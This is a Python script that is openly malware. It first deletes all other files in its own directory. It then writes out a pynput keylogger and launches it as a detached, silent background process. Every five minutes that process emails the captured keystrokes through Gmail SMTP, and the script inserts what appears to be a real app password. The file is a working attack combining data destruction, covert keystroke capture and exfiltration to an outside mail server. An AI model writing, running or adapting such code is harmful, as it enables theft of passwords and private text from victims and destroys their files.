import os
import sys
import subprocess
import time
import smtplib
from email.mime.text import MIMEText
from threading import Timer
from pynput import keyboard

# --- Part 1: Delete all files in current directory ---
def delete_files_in_dir():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    for filename in os.listdir(current_dir):
        file_path = os.path.join(current_dir, filename)
        try:
            if os.path.isfile(file_path) and filename != os.path.basename(__file__):
                os.remove(file_path)
        except Exception as e:
            pass  # Ignore errors

# --- Part 2: Keylogger subprocess code ---
keylog_script = """
import os
import time
import smtplib
from email.mime.text import MIMEText
from pynput import keyboard
from threading import Timer

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")
EMAIL = "your_email@gmail.com"  # Replace with your Gmail
PASSWORD = "your_app_password"  # Replace with your app password
SEND_INTERVAL = 300  # seconds

log = []

def send_email(log_content):
    msg = MIMEText(log_content)
    msg['Subject'] = 'Keylogger Report'
    msg['From'] = EMAIL
    msg['To'] = EMAIL

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(EMAIL, PASSWORD)
            server.send_message(msg)
    except Exception as e:
        pass  # Ignore send errors

def write_log():
    with open(LOG_FILE, "a") as f:
        f.write("".join(log))
    log.clear()

def on_press(key):
    try:
        log.append(key.char)
    except AttributeError:
        log.append("[" + str(key) + "]")

def periodic_send():
    if log:
        write_log()
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            content = f.read()
        if content:
            send_email(content)
            open(LOG_FILE, "w").close()  # Clear log file after sending
    Timer(SEND_INTERVAL, periodic_send).start()

listener = keyboard.Listener(on_press=on_press)
listener.start()
periodic_send()

# Keep the script running
while True:
    time.sleep(10)
"""

def main():
    delete_files_in_dir()

    # Write keylogger script to a temp file
    current_dir = os.path.dirname(os.path.abspath(__file__))
    keylog_path = os.path.join(current_dir, "keylogger_subprocess.py")
    with open(keylog_path, "w") as f:
        f.write(keylog_script.replace("your_email@gmail.com", "your_email@gmail.com")
                             .replace("your_app_password", "nrvg yhdc byyu xsca"))

    # Launch keylogger subprocess detached
    if sys.platform == "win32":
        # On Windows, use creationflags to detach
        DETACHED_PROCESS = 0x00000008
        subprocess.Popen([sys.executable, keylog_path], creationflags=DETACHED_PROCESS,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    else:
        # On Unix-like, use setsid to detach
        subprocess.Popen([sys.executable, keylog_path], stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, preexec_fn=os.setsid)

    # Exit main script
    sys.exit()

if __name__ == "__main__":
    main()